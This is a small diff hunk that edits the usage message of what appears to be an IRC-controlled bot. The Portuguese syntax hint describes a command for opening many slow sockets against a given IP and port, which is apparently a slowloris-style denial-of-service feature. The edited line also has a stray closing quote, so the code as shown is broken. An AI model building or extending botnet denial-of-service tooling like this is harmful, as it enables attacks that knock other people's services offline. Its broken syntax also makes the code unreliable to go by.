@@ -463,7 +463,7 @@ def main():
                 tmp3 = p[7]
                 sport = int(float(tmp3))
             except IndexError:
-                msgSend(ircChannel, "[+] Sintaxe [+] use: <slow start> <socket count> <ip> <port> [wave]<" + botNick + ">")
+                msgSend(ircChannel, "[+] Sintaxe [+] use: <slow start> <socket count> <ip> <port> [<" + botNick +"> ou <wave>]"")
             except ValueError:
                 pass
             else:
